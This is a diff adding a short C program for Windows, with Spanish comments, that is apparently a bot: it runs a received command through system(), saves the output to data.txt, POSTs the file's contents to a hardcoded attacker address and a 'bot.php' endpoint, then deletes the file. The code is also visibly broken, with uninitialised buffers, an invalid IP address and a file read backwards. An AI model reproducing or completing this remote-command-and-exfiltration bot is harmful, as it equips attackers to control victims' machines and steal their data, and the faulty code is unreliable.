@@ -1,0 +1,68 @@
+#define IP "48.123.321.123"
+#define PUERTO 80
+ 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <windows.h>
+#include <direct.h>
+#include <conio.h>
+#include <time.h>
+#include <math.h>
+ 
+int main()
+{
+    char cola[20]=">data.txt",comando[100];
+    //recibiría el comando
+    strcat(comando,cola);
+    system(comando);
+    conecta("data.txt");//sube la variable del usuario y contenido del archivo
+    //(lo que devolvio la cmd) para cargar en vars en el PHP y mostrar allí
+    return 0;
+}
+ 
+void conecta(char nombre[])
+{
+    FILE *dat;
+    WSADATA wsa;
+    int sok,len,i=0;
+    struct sockaddr_in dir;
+    char buf[60384],cad[60384],aux[10],borra[50]="del ",car;
+    WSAStartup(MAKEWORD(2,0),&wsa);
+    if((sok=socket(AF_INET,SOCK_STREAM,0))==-1){}
+    else{
+        dir.sin_family=AF_INET;
+        dir.sin_port=htons(PUERTO);
+        dir.sin_addr.s_addr=inet_addr(IP);
+        strcat(cad,"n=");
+        strcat(cad,nombre);
+        strcat(cad,"&b=");
+        dat=fopen(nombre,"rt");
+        if(nombre==NULL)
+        {
+            exit(0);
+        }
+        while(car!=EOF)
+        {
+            i++;
+            fseek(dat,-i,SEEK_END);
+            car=fgetc(dat);
+            cad[strlen(cad)]=car;
+        }
+        fclose(dat);
+        len=strlen(cad);
+        printf("%s",cad);
+        itoa(len,aux,10);
+        strcpy(buf,"POST direcotior_protegido/bot.php HTTP/1.1\r\n");
+        strcat(buf,"Host: hostquesea.com\r\n");
+        strcat(buf,"Content-type: application/x-www-form-urlencoded\r\n");
+        strcat(buf,"Content-length: ");
+        strcat(buf,aux);
+        strcat(buf,"\r\n\r\n");
+        strcat(buf,cad);
+        connect(sok,(struct sockaddr*)&dir,sizeof(dir));
+        send(sok,buf,strlen(buf),0);
+        strcat(borra,nombre);
+        system(borra);
+    }
+}
